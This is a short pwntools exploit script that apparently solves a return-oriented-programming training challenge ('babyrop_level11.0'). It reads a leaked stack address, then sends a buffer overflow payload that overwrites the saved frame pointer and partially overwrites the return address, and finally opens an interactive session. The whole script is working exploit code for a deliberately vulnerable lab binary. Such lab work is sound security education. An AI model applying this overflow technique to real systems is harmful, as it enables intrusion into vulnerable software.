from pwn import *

r = process('/challenge/babyrop_level11.0')
r.recvuntil(b'input buffer is located at: ')
stack = int(r.recv(14),16) 
print(hex(stack))

r.send(b'\x00'*0x78 + p64(stack-0x10) + b'\xd8\xf5')

r.interactive()